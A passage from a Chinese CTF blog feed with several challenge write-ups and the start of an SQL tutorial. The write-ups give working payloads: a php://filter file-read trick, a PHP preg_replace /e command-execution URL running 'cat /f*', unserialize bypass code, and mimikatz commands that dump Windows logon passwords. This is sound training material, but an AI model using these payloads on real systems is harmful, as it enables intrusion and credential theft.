class="title">container</span>&quot;&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">mdl</span>-<span class="title">ripple</span> <span class="title">is</span>-<span class="title">animating</span>&quot; <span class="title">style</span>=&quot;<span class="title">width</span>: 189.356<span class="title">px</span>; <span class="title">height</span>: 189.356<span class="title">px</span>; <span class="title">transform</span>: <span class="title">translate</span>(-50%, -50%) <span class="title">translate</span>(31<span class="title">px</span>, 25<span class="title">px</span>);&quot;&gt;&lt;/<span class="title">span</span>&gt;&lt;/<span class="title">span</span>&gt;&lt;/<span class="title">button</span>&gt;&lt;/<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">          &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">main</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">js</span>/<span class="title">material</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><h3 id="好的骚操作"><a href="#好的骚操作" class="headerlink" title="好的骚操作"></a>好的骚操作</h3><blockquote><p>伪协议之后 还可以嵌套 我们目前想要读取 flag 只能使用<br>伪协议   php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag<br>但是我们必须要出现一个if( strpos( $file, “woofers” ) !&#x3D;&#x3D;  false || strpos( $file, “meowers” ) !&#x3D;&#x3D;  false || strpos( $file, “index”)){</p></blockquote><h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;woofers&#x2F;resource&#x3D;flag </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf刷题记录2</title>
      <link href="/2024/05/14/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/"/>
      <url>/2024/05/14/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240514215651.png" alt="image.png"></p><h2 id="SWPUCTF-2021-新生赛-pop"><a href="#SWPUCTF-2021-新生赛-pop" class="headerlink" title="[SWPUCTF 2021 新生赛]pop"></a>[SWPUCTF 2021 新生赛]pop</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin </span>= <span class="string">&#x27;aaa&#x27;</span>;  </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd </span>= <span class="string">&#x27;123456&#x27;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span><span class="title function_ invoke__"> function Getflag</span>()&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;  </span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);  </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;  </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;  </span><br><span class="line">    <span class="keyword">public</span><span class="title function_ invoke__"> function __destruct</span>()&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;  </span><br><span class="line">    <span class="keyword">public</span><span class="title function_ invoke__"> function __toString</span>()&#123;   </span><br><span class="line">         <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$w00m </span>= <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];  </span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;(); </span><br><span class="line">在 PHP 中，可以使用花括号语法来动态调用对象的方法。在你的代码中，`<span class="variable language_">$this</span>-&gt;w00m`是一个对象，`<span class="variable language_">$this</span>-&gt;w22m`是一个字符串，表示方法名。通过将花括号放在对象后面，并在花括号内使用变量作为方法名，你可以动态调用对象的方法。</span><br><span class="line"></span><br><span class="line">注意这个 我们可以用这个来调用类的方法</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="HUBUCTF-2022-新生赛-checkin"><a href="#HUBUCTF-2022-新生赛-checkin" class="headerlink" title="[HUBUCTF 2022 新生赛]checkin"></a>[HUBUCTF 2022 新生赛]checkin</h2><blockquote><p>真恶心</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="variable">$username  </span>= <span class="string">&quot;this_is_secret&quot;</span>; <span class="variable">$password  </span>= <span class="string">&quot;this_is_not_known_to_you&quot;</span>;   </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//here I changed those two </span></span><br><span class="line"><span class="variable">$info </span>= <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]: <span class="string">&quot;&quot;</span> ;  </span><br><span class="line"><span class="variable">$data_unserialize </span>= <span class="title function_ invoke__">unserialize</span>(<span class="variable">$info</span>);  </span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="variable">$data_unserialize</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$username</span>&amp;&amp;<span class="variable">$data_unserialize</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="variable">$password</span>)&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;username or password error!&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>include(“flag.php”);&#x2F;&#x2F;here I changed those two <br>这句话真是害人匪浅<br>没做过每加类的 一些题目 今天还遇上一个数组的反序列化</p></blockquote><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$person</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="HUBUCTF-2022-新生赛-最简单的misc"><a href="#HUBUCTF-2022-新生赛-最简单的misc" class="headerlink" title="[HUBUCTF 2022 新生赛]最简单的misc"></a>[HUBUCTF 2022 新生赛]最简单的misc</h2><p>纯手感<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240508204421.png" alt="image.png"></p><p>三个钩 这就是很灵性的 </p><h2 id="HUBUCTF-2022-新生赛-Calculate"><a href="#HUBUCTF-2022-新生赛-Calculate" class="headerlink" title="[HUBUCTF 2022 新生赛]Calculate"></a>[HUBUCTF 2022 新生赛]Calculate</h2><blockquote><p>Breeze 师傅tql   tql 膜拜脚本</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line"><span class="keyword">import</span> re  </span><br><span class="line">  </span><br><span class="line">url = <span class="string">&#x27;http://node5.anna.nssctf.cn:23323/&#x27;</span>  </span><br><span class="line">res = requests.session() <span class="comment">#创建session对象，用来保存当前会话的持续有效性。不创建也可以调用对应的方法发送请求，但是没有cookie，那就无法记录答题数量。  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>):  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;正在执行第<span class="subst">&#123;i&#125;</span>次------&quot;</span>)  </span><br><span class="line">math = <span class="string">&quot;&quot;</span>  </span><br><span class="line">  </span><br><span class="line">response = res.get(url) <span class="comment">#发get包，获取题目  </span></span><br><span class="line">  </span><br><span class="line">resTest = response.text <span class="comment">#获取返回包的内容  </span></span><br><span class="line">li=re.findall(<span class="string">&quot;&gt;([0-9*/+-])&lt;&quot;</span>,resTest)  </span><br><span class="line"><span class="comment">## tql 这才是python大神·</span></span><br><span class="line"><span class="comment"># &gt;&lt; 这个是不匹配的  只匹配 里面的() 的东西 并且返回一个[]列表 </span></span><br><span class="line"><span class="comment"># 再转成字符串放到python 里面执行</span></span><br><span class="line">math=<span class="string">&quot;&quot;</span>.join(li)  </span><br><span class="line"><span class="built_in">print</span>(math)  </span><br><span class="line">num = <span class="built_in">eval</span>(math) <span class="comment">#计算数学表达式的值  </span></span><br><span class="line">  </span><br><span class="line">myData = &#123; <span class="comment">#构造的POST数据  </span></span><br><span class="line"><span class="string">&#x27;ans&#x27;</span>: num  </span><br><span class="line">&#125;  </span><br><span class="line">time.sleep(<span class="number">1</span>) <span class="comment"># 睡一秒  </span></span><br><span class="line">response = res.post(url, data=myData) <span class="comment">#发post包，提交答案  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;NSSCTF&#123;&quot;</span> <span class="keyword">in</span> response.text: <span class="comment">#如果返回包里面有flag  </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flaggggggggg: &quot;</span>, response.text)  </span><br><span class="line">exit() <span class="comment"># 退出当前程序，也可以break</span></span><br></pre></td></tr></table></figure><h2 id="HUBUCTF-2022-新生赛-messy-traffic"><a href="#HUBUCTF-2022-新生赛-messy-traffic" class="headerlink" title="[HUBUCTF 2022 新生赛]messy_traffic"></a>[HUBUCTF 2022 新生赛]messy_traffic</h2><blockquote><p>这道题不想多说 直接看http流量自然就有密码 和 webshell flag.zip</p></blockquote><blockquote></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf刷题记录1</title>
      <link href="/2024/05/14/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/"/>
      <url>/2024/05/14/ctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240514215722.png" alt="image.png"></p><h2 id="HUBUCTF-2022-新生赛-vmem"><a href="#HUBUCTF-2022-新生赛-vmem" class="headerlink" title="[HUBUCTF 2022 新生赛]vmem"></a>[HUBUCTF 2022 新生赛]vmem</h2><blockquote><p>开局一个zip压缩包 打开是一个 什么呢?<br>虚拟机快照 和一个内存取证 的 包</p></blockquote><h3 id="开局先看信息"><a href="#开局先看信息" class="headerlink" title="开局先看信息"></a>开局先看信息</h3><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240510111527.png" alt="image.png"></p><p>扫描目录</p><p><img src="/Pasted%20image%2020240509195406.png"></p><p>直接dump下来<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240510112247.png" alt="image.png"></p><p>很抽象<br>png 可以直接看到flag2<br>flag.txt 可以直接得到第一段<br>flag3.txt需要提取 前一段的代码<br>执行之后 可以得到第三段<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240510113056.png" alt="image.png"></p><p>flag&#x3D;NSSCTF{W0w_y0u_G3t_th3_P4sSWd_YOu_WanT!}</p><h2 id="啊哒"><a href="#啊哒" class="headerlink" title="啊哒"></a>啊哒</h2><p>以后不看隐写了 直接拖到 010 看格式<br>发现pk 一看不对劲啊 直接binwalk分离 </p><p>出来zip文件 </p><p>密码在属性里面 一串 字符串 需要 十六进制 转字符串</p><h2 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h2><blockquote><p>得到一张图片 说实话 一看这张图片我就能看到 pk<br>但是需要修复  直接添加 50 4b 上面去<br>的到压缩包<br>直接用明文攻击</p></blockquote><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="BJDCTF2020]ZJCTF，不过如此"></a>BJDCTF2020]ZJCTF，不过如此</h2><p>不想多说第一步 两个伪协议读出next.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">next.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line"></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    @<span class="keyword">eval</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="http://f5526dc6-eadc-42fe-8be0-f06aa7495b86.node5.buuoj.cn:81/next.php?%5CS*=$%7BgetFlag()%7D&cmd=system(%27cat%20/f*%27)">http://f5526dc6-eadc-42fe-8be0-f06aa7495b86.node5.buuoj.cn:81/next.php?\S*=${getFlag()}&amp;cmd=system(%27cat%20/f*%27)</a>;</p><p>这个在php中的pre_replace 和 \e正则表达的命令执行漏洞<br>但是我发现 只能执行一下没有符号的 命令 大概是匹配的问题<br>不如直接写getFlag() 之后跟上参数</p><h2 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h2><p>又是一个流量包 分析 直接看http协议 200 相应包 发现 zip压缩包<br>foremost 分离之后需要密码<br>又是一通好找  找不到<br>看完wp才发现</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240512094237.png" alt="image.png"></p><p>内网·1………..<br>mikikatz   可以直接获取密码</p><p>执行:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">sekurlsa::minidump lsass.dmp </span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>湖北大学-奇安信杯完整版wp</title>
      <link href="/2024/05/14/%E6%B9%96%E5%8C%97%E5%A4%A7%E5%AD%A6-%E5%A5%87%E5%AE%89%E4%BF%A1%E6%9D%AF%E5%AE%8C%E6%95%B4%E7%89%88wp/"/>
      <url>/2024/05/14/%E6%B9%96%E5%8C%97%E5%A4%A7%E5%AD%A6-%E5%A5%87%E5%AE%89%E4%BF%A1%E6%9D%AF%E5%AE%8C%E6%95%B4%E7%89%88wp/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240514214149.png" alt="image.png"></p><p>完整版wp请移步 公众号<br><a href="https://mp.weixin.qq.com/s?__biz=MzkwMzY2MTcwMw==&amp;mid=2247484669&amp;idx=1&amp;sn=d1a793cd381a05f23b07f5342c57b4b8&amp;chksm=c0939515f7e41c03eadda4f0574548a89cd4ea907141db65b327d38b3ae36c4751d9c4a9bfa8&token=447748693&lang=zh_CN&poc_token=HKtrQ2ajR60XC30m6aWHUhthEEFr6ojYcBenSXh3"></a></p><h3 id="MISC简单解析"><a href="#MISC简单解析" class="headerlink" title="MISC简单解析"></a>MISC简单解析</h3><p>一. Try_it</p><p>八位数字 爆破（ 这么长 ）  12345678</p><p>打开之后是一个  flag.txt</p><p>一眼</p><p>二. reverse me</p><p>010 全部给他换了</p><p>_”””_with open(“d:&#x2F;1”,”rb”) as file1:<br>    text&#x3D;file1.read()  </p><p>with open(“d:&#x2F;2”,”wb”) as file2:<br>   file2.write(text[::-1]</p><p>得到flag</p><p>三. Passwd</p><p>可以看到是一个tcp 流</p><p>直接跟踪 看到passwd 注意 7f 是删除键</p><p>好坑啊</p><p>删除 oor 删除 8</p><p>四. Convert</p><p>看到全是010101010101010</p><p>直接全部转成 hex 打开 那个 是一个rar压缩包</p><p>直接在详细信息拿到那个 base串</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql-表修改和创建</title>
      <link href="/2024/05/03/sql1/"/>
      <url>/2024/05/03/sql1/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240503172122.png" alt="image.png"></p><h2 id="峰回路转"><a href="#峰回路转" class="headerlink" title="峰回路转"></a>峰回路转</h2><blockquote><p> 忘记学 创建 数据库了………………..<br> 来了解一下</p></blockquote><h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><h4 id="简单方式"><a href="#简单方式" class="headerlink" title="简单方式"></a>简单方式</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE 数据库名;</span><br></pre></td></tr></table></figure><h4 id="稍稍难"><a href="#稍稍难" class="headerlink" title="稍稍难"></a>稍稍难</h4><blockquote><p><em><strong>目的是 查看 是否你的名字重复</strong></em></p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> mydatabase;</span><br></pre></td></tr></table></figure><h4 id="带参数"><a href="#带参数" class="headerlink" title="带参数"></a>带参数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE [IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] database_name</span><br><span class="line">  [<span class="keyword">CHARACTER SET</span> charset_name]</span><br><span class="line">  [<span class="keyword">COLLATE</span> collation_name];</span><br><span class="line"><span class="comment">-- 看看实力</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE mydatabase  </span><br><span class="line">  <span class="keyword">CHARACTER SET</span> utf8mb4  </span><br><span class="line">  <span class="keyword">COLLATE</span> utf8mb4_general_ci;</span><br></pre></td></tr></table></figure><h2 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> DATABASE <span class="operator">&lt;</span>database_name<span class="operator">&gt;</span>;        <span class="comment">-- 直接删除数据库，不检查是否存在</span></span><br><span class="line">或</span><br><span class="line"><span class="keyword">DROP</span> DATABASE [IF <span class="keyword">EXISTS</span>] <span class="operator">&lt;</span>database_name<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use  相对应数据库名字;</span><br></pre></td></tr></table></figure><h1 id="回正题进入第二天正式学习"><a href="#回正题进入第二天正式学习" class="headerlink" title="回正题进入第二天正式学习"></a>回正题进入第二天正式学习</h1><h2 id="修改表-alter"><a href="#修改表-alter" class="headerlink" title="修改表 alter"></a>修改表 alter</h2><h3 id="添加列"><a href="#添加列" class="headerlink" title="添加列"></a>添加列</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">ALTER TABLE</span> table_name</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">COLUMN</span> new_column_name datatype;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="修改列的数据类型"><a href="#修改列的数据类型" class="headerlink" title="修改列的数据类型"></a>修改列的数据类型</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER TABLE</span> TABLE_NAME  </span><br><span class="line">MODIFY <span class="keyword">COLUMN</span> column_name new_datatype;</span><br></pre></td></tr></table></figure><h3 id="修改列名"><a href="#修改列名" class="headerlink" title="修改列名"></a>修改列名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER TABLE</span> table_name</span><br><span class="line">CHANGE <span class="keyword">COLUMN</span> old_column_name new_column_name datatype;</span><br></pre></td></tr></table></figure><h3 id="删除列"><a href="#删除列" class="headerlink" title="删除列"></a>删除列</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER TABLE</span> table_name</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">COLUMN</span> column_name;</span><br></pre></td></tr></table></figure><h3 id="添加-PRIMARY-KEY"><a href="#添加-PRIMARY-KEY" class="headerlink" title="添加 PRIMARY KEY"></a>添加 PRIMARY KEY</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER TABLE</span> table_name</span><br><span class="line"><span class="keyword">ADD</span> <span 